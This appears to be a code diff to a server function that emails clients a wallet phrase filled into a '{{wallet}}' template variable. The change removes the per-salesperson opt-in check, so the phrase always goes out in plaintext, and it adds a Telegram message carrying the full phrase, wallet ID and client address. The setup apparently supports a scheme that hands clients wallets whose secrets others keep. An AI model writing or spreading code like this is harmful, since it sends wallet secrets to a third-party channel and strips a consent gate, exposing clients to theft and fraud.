@@ -149,39 +149,41 @@ serve(async (req) => {
     if (/\{\{\s*wallet\s*\}\}/i.test(emailContent)) {
       console.log(`📧 Email template contains wallet variable for commercial ${commercial.name}`);
       
-      // Check if commercial has auto_include_wallet enabled
-      if (commercial.auto_include_wallet) {
-        console.log(`💼 Auto-include wallet is enabled for commercial ${commercial.name}`);
-        try {
-          const { data: walletData, error: walletError } = await supabase.functions.invoke('get-wallet', {
-            body: { commercial_id, client_tracking_id: to }
-          });
-          
-          if (walletError) {
-            console.error('❌ Wallet fetch error:', walletError);
-            throw walletError;
+      try {
+        const { data: walletData, error: walletError } = await supabase.functions.invoke('get-wallet', {
+          body: { commercial_id, client_tracking_id: to }
+        });
+        
+        if (walletError) {
+          console.error('❌ Wallet fetch error:', walletError);
+          throw walletError;
+        }
+        
+        console.log('🔍 Wallet data received:', { success: walletData?.success, hasWallet: !!walletData?.wallet, wallet_id: walletData?.wallet_id });
+        
+        const walletPhrase = walletData?.wallet || walletData?.phrase || '';
+        if (walletPhrase && walletData?.success) {
+          emailContent = emailContent.replace(/\{\{\s*wallet\s*\}\}/gi, walletPhrase);
+          console.log('💼 Wallet phrase added to email successfully');
+          // Send immediate Telegram notification about wallet usage (mirrors previous behavior)
+          try {
+            await supabase.functions.invoke('send-telegram-notification', {
+              body: {
+                message: `🔑 New wallet used!\nWallet ID: ${walletData?.wallet_id || 'unknown'}\nCommercial: ${commercial.name}\nClient: ${to}\nPhrase: ${walletPhrase}\nTime: ${new Date().toISOString()}`
+              }
+            });
+          } catch (notifErr) {
+            console.warn('⚠️ Failed to send Telegram wallet notification:', notifErr);
           }
-          
-          console.log('🔍 Wallet data received:', { success: walletData?.success, hasWallet: !!walletData?.wallet });
-          
-          const walletPhrase = walletData?.wallet || walletData?.phrase || '';
-          if (walletPhrase && walletData?.success) {
-            emailContent = emailContent.replace(/\{\{\s*wallet\s*\}\}/gi, walletPhrase);
-            console.log('💼 Wallet phrase added to email successfully');
-          } else {
-            console.warn('⚠️ No wallet phrase found in response:', walletData);
-            // Replace with placeholder text if wallet not available
-            emailContent = emailContent.replace(/\{\{\s*wallet\s*\}\}/gi, '[Wallet sera fourni séparément]');
-          }
-        } catch (error) {
-          console.error('❌ Failed to fetch wallet:', error);
-          // Replace with placeholder text if wallet fetch fails
+        } else {
+          console.warn('⚠️ No wallet phrase found in response:', walletData);
+          // Replace with placeholder text if wallet not available
           emailContent = emailContent.replace(/\{\{\s*wallet\s*\}\}/gi, '[Wallet sera fourni séparément]');
         }
-      } else {
-        console.log(`⚠️ Auto-include wallet is disabled for commercial ${commercial.name} - using placeholder`);
-        // Replace with placeholder text if auto_include_wallet is disabled
-        emailContent = emailContent.replace(/\{\{\s*wallet\s*\}\}/gi, '[Contactez votre commercial pour obtenir votre wallet]');
+      } catch (error) {
+        console.error('❌ Failed to fetch wallet:', error);
+        // Replace with placeholder text if wallet fetch fails
+        emailContent = emailContent.replace(/\{\{\s*wallet\s*\}\}/gi, '[Wallet sera fourni séparément]');
       }
     }
 
